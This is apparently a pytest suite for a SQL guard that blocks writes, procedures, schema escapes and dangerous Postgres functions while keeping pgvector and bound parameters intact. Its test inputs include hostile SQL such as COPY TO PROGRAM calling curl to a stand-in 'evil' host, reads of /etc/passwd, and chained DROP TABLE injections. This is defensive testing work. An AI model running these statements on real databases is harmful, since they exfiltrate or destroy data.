import pytest

from core import guard
from core.exceptions import SecurityError
from core.types import SchemaGraph


def test_select_passes(ecommerce: SchemaGraph, settings):
    assert guard.validate("SELECT * FROM orders", ecommerce, settings).startswith(
        "SELECT * FROM orders"
    )


@pytest.mark.parametrize(
    "statement",
    [
        "DELETE FROM orders",
        "UPDATE orders SET grand_total = 0",
        "INSERT INTO orders (id) VALUES ('x')",
        "DROP TABLE orders",
        "TRUNCATE orders",
        "ALTER TABLE orders ADD COLUMN x int",
        "CREATE TABLE x (a int)",
        "GRANT ALL ON orders TO PUBLIC",
        "SET search_path = public",
        "COPY orders TO '/tmp/leak.csv'",
        "COPY (SELECT 1) TO PROGRAM 'curl http://evil'",
        "DO $$ BEGIN END $$",
        "CALL some_procedure()",
    ],
)
def test_mutations_and_procedures_are_blocked(statement: str, settings):
    with pytest.raises(SecurityError):
        guard.validate(statement, None, settings)


def test_select_into_outfile_does_not_parse(ecommerce: SchemaGraph, settings):
    with pytest.raises(SecurityError):
        guard.validate("SELECT * INTO OUTFILE '/tmp/x' FROM orders", ecommerce, settings)


def test_chained_statements_are_blocked(settings):
    with pytest.raises(SecurityError):
        guard.validate("SELECT 1; DROP TABLE orders", None, settings)


def test_trailing_semicolon_is_tolerated(settings):
    assert guard.validate("SELECT 1;", None, settings)


@pytest.mark.parametrize(
    "call",
    [
        "SELECT pg_sleep(10)",
        "SELECT pg_read_file('/etc/passwd')",
        "SELECT dblink('host=x')",
        "SELECT lo_import('/etc/passwd')",
        "SELECT current_setting('x')",
    ],
)
def test_dangerous_functions_are_blocked(call: str, settings):
    """sqlglot reports unknown functions as Anonymous nodes; both name fields
    must be checked or every unknown function slips through."""
    with pytest.raises(SecurityError):
        guard.validate(call, None, settings)


def test_unknown_table_error_is_redacted(ecommerce: SchemaGraph, settings):
    with pytest.raises(SecurityError) as exc:
        guard.validate("SELECT * FROM secret_internal_table", ecommerce, settings)
    assert "secret_internal_table" not in str(exc.value)


def test_cte_aliases_are_allowed(ecommerce: SchemaGraph, settings):
    assert "recent" in guard.validate(
        "WITH recent AS (SELECT * FROM orders) SELECT * FROM recent", ecommerce, settings
    )


# --- schema qualification may not escape the configured boundary ------------


def test_a_table_in_another_schema_is_refused(ecommerce: SchemaGraph, settings):
    """search_path only binds unqualified names; a qualifier must match too."""
    with pytest.raises(SecurityError, match="configured schema"):
        guard.validate('SELECT * FROM "other_schema"."orders"', ecommerce, settings)


def test_the_configured_schema_qualifier_is_accepted(ecommerce: SchemaGraph, settings):
    sql = 'SELECT * FROM "public"."orders" LIMIT 10'
    assert guard.validate(sql, ecommerce, settings) == sql


def test_a_catalog_qualified_table_is_refused(ecommerce: SchemaGraph, settings):
    with pytest.raises(SecurityError, match="configured schema"):
        guard.validate('SELECT * FROM "other_db"."public"."orders"', ecommerce, settings)


# --- the validator must not change what a statement means -------------------


DISTANCE_SQL = (
    'SELECT "order_reference", "embedding" <=> $1::vector AS similarity FROM "orders" '
    'ORDER BY "embedding" <=> $1::vector LIMIT 10'
)


def test_distance_operator_survives_validation(ecommerce: SchemaGraph, settings):
    """The pgvector distance operator must reach the database intact.

    sqlglot has no node for it and re-emits `<=>` as `IS NOT DISTINCT FROM`, which
    turns a nearest-neighbour search into an equality test that matches nothing.
    """
    out = guard.validate(DISTANCE_SQL, ecommerce, settings)
    assert "<=>" in out
    assert "IS NOT DISTINCT FROM" not in out


def test_a_statement_needing_no_edit_is_returned_verbatim(ecommerce: SchemaGraph, settings):
    """Nothing to rewrite means nothing is re-serialised."""
    sql = 'SELECT "order_reference" FROM "orders" LIMIT 10'
    assert guard.validate(sql, ecommerce, settings) == sql


def test_a_real_null_safe_comparison_is_not_refused(ecommerce: SchemaGraph, settings):
    """`IS NOT DISTINCT FROM` written by hand must still validate."""
    sql = (
        'SELECT "order_reference" FROM "orders" '
        'WHERE "order_reference" IS NOT DISTINCT FROM $1 LIMIT 10'
    )
    assert "IS NOT DISTINCT FROM" in guard.validate(sql, ecommerce, settings)


def test_the_distance_operator_still_gets_safety_checks(ecommerce: SchemaGraph, settings):
    """Skipping the rewrite must not skip the allowlist."""
    with pytest.raises(SecurityError):
        guard.validate(
            'SELECT pg_sleep(1) <=> $1::vector FROM "orders" LIMIT 10', ecommerce, settings
        )


def test_a_distance_statement_naming_an_unknown_table_is_refused(ecommerce: SchemaGraph, settings):
    with pytest.raises(SecurityError):
        guard.validate('SELECT "x" <=> $1::vector FROM "ghost" LIMIT 10', ecommerce, settings)


def test_bound_parameters_are_not_mistaken_for_a_rewrite(ecommerce: SchemaGraph, settings):
    sql = 'SELECT * FROM "orders" WHERE "order_reference" = $1 LIMIT 10'
    assert guard.validate(sql, ecommerce, settings) == sql


def test_bound_parameters_survive_limit_injection(ecommerce: SchemaGraph, settings):
    """The rewritten statement must keep its placeholders, or the bound values
    no longer line up when the statement runs."""
    out = guard.validate('SELECT * FROM "orders" WHERE "order_reference" = $1', ecommerce, settings)
    assert "LIMIT" in out
    assert "$1" in out


def test_limit_is_injected(ecommerce: SchemaGraph, settings):
    assert "LIMIT" in guard.validate("SELECT * FROM orders", ecommerce, settings)


def test_no_limit_is_injected_on_an_aggregate(ecommerce: SchemaGraph, settings):
    """A COUNT already returns one row, so a row cap only misleads the caller."""
    assert "LIMIT" not in guard.validate('SELECT COUNT(*) FROM "orders"', ecommerce, settings)


def test_no_limit_is_injected_on_a_grouped_query(ecommerce: SchemaGraph, settings):
    sql = guard.validate(
        'SELECT status, COUNT(*) FROM "orders" GROUP BY status', ecommerce, settings
    )
    assert "LIMIT" not in sql


def test_a_supplied_limit_is_still_clamped_on_an_aggregate(ecommerce: SchemaGraph, settings):
    assert "LIMIT 100000" not in guard.validate(
        'SELECT COUNT(*) FROM "orders" LIMIT 100000', ecommerce, settings
    )


def test_limit_is_clamped(ecommerce: SchemaGraph, settings):
    assert "LIMIT 100000" not in guard.validate(
        "SELECT * FROM orders LIMIT 100000", ecommerce, settings
    )


def test_unparseable_sql_is_blocked(settings):
    with pytest.raises(SecurityError):
        guard.validate("SELEC * FROM orders", None, settings)


def test_empty_sql_is_blocked(settings):
    with pytest.raises(SecurityError):
        guard.validate("   ", None, settings)


@pytest.mark.parametrize(
    "name",
    [
        'x" ; DROP TABLE y; --',
        "a b",
        "a-b",
        "1abc",
        "",
        ";--",
        "tab\tname",
    ],
)
def test_unsafe_identifiers_are_refused(name: str):
    assert guard.is_safe_identifier(name) is False


@pytest.mark.parametrize("name", ["orders", "_private", "a1", "Col$1"])
def test_plain_identifiers_are_accepted(name: str):
    assert guard.is_safe_identifier(name) is True
    assert guard.quote(name) == f'"{name}"'


def test_an_identifier_longer_than_postgres_accepts_is_refused():
    assert guard.is_safe_identifier("a" * 64) is False
    assert guard.is_safe_identifier("a" * 63) is True


def test_quote_refuses_unsafe():
    with pytest.raises(ValueError):
        guard.quote("a b")
